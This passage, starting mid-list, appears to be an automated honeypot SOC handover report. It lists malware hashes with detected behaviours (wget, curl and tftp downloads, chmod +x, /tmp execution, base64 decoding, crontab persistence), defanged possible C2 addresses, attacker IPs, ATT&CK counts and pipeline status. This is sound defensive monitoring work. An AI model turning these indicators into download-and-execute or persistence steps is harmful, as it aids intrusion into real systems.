- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `52.237.80[.]79` | SG | Microsoft Corporation | **100** ⚠️ | 0 |
| `66.132.195[.]96` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `193.47.62[.]69` | NL | BESTDC LIMITED | **100** ⚠️ | 50 |
| `66.132.224[.]79` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `66.132.195[.]161` | US | Censys, Inc. | **100** ⚠️ | 4 |
| `187.216.224[.]85` | MX | Uninet S.A. de C.V. | **100** ⚠️ | 50 |
| `172.236.228[.]111` | US | Linode | **100** ⚠️ | 50 |
| `119.96.158[.]87` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `176.109.80[.]6` | RU | MTS PJSC | **100** ⚠️ | 3 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 168 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 129 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 41 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 41 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 6 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 15 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 273 cases |
| Tool 34  | Credential Extractor        | ✅ 4030 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 27 fingerprints |
| Tool 36  | Command Clustering          | ✅ 17 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 179 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (14.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 83 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 126 priority case(s) shown individually · 103 recon entry/entries in table (4 group(s) consolidating 8 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-17T14:37:37Z_
